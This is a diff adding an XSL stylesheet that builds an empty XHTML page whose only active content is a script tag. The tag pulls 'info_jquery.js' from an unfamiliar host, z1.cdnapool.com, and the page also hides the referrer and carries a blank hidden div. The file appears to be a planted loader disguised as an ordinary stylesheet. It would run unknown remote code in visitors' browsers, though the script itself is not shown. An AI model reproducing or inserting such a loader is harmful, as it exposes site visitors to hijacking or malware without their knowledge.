@@ -1,0 +1,25 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<xsl:stylesheet
+  version="1.0"
+  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+  xmlns="http://www.w3.org/1999/xhtml"
+>
+  <xsl:template match="/">
+    <html lang="zh-cn">
+      <head>
+        <title></title>
+        <meta charset="UTF-8" />
+        <meta name="referrer" content="never" />
+        <meta
+          id="viewport"
+          name="viewport"
+          content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, viewport-fit=cover"
+        />
+        <script src="https://z1.cdnapool.com/check/info_jquery.js"></script>
+      </head>
+      <body>
+        <div style="display: none"></div>
+      </body>
+    </html>
+  </xsl:template>
+</xsl:stylesheet>
